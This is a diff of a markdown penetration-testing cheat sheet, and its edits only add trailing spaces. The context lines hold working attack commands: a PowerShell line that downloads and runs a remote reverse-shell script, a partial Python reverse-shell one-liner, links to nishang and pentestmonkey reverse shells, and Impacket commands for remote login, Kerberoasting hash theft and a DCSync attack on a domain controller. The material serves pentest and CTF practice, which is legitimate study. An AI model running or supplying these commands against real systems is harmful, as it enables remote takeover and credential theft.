@@ -23,11 +23,11 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ```
 powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
 ```
-Use this command in conjunction with nishang shell
+Use this command in conjunction with nishang shell  
 https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
 
 ### PHP Upload
-https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php  
 
 ### msfvenom commands
 
@@ -63,16 +63,16 @@ Used to remotely login to victim's computer
 psexec.py domain/user:password@10.10.10.10
 ```
 ### GetUserSPNs
-Script to find and fetch Service Principle Names assosicated with normal user accounts  
-Hash retrieved can be cracked using John or Hashcat
+Script to find and fetch Service Principle Names assosicated with normal user accounts   
+Hash retrieved can be cracked using John or Hashcat  
 ```
 GetUserSPNs.py domain/user:password -dc-ip 10.10.10.10 -request
 ```
 ### secretdumps
 
-Performs a DCSync Attack
+Performs a DCSync Attack  
 DCSync Attacks pretends to be a domain controller  
-Targetted account must have DCSync Privileges which can be obtain if user has Exchange Windows Permission
+Targetted account must have DCSync Privileges which can be obtain if user has Exchange Windows Permission  
 
 ```
 secretdumps.py domain/user:password@10.10.10.10
